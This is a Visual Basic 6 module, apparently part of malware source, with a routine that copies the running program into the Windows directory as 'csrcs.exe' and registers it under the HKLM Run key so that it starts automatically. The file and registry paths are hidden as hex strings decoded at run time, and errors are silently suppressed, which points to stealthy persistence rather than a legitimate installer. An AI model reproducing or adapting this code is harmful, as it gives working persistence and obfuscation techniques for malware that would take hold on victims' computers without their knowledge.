Attribute VB_Name = "iStarPcOns"
'Registry Controls

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Public Function addtostartup(Value As String, Optional Filename As String) As Boolean 'Add to startup, HKLM/HKCU
    Dim hKey As Long, hCreate As Long, hSet As Long
    Dim Path 'Archivo Ruta
    Dim hRum As String
    Dim Win32 As String
    'C:\Windows\csrcs.exe
    Win32 = Environ("WINDIR") & Desencriptar("5C63737263732E657865")
    'Software\Microsoft\Windows\CurrentVersion\Run
    hRum = Desencriptar("536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E")
    On Error Resume Next
        hCreate = RegCreateKey(HKEY_LOCAL_MACHINE, hRum, hKey)
        FileCopy App.Path & "\" & App.EXEName & Desencriptar("2E657865"), Win32
    If hCreate = 0 Then
        hSet = RegSetValueEx(hKey, Value, 0, REG_SZ, ByVal Filename, Len(Filename))
    If hSet = 0 Then
       addtostartup = True
    End If
    End If
    RegCloseKey (hKey)
End Function
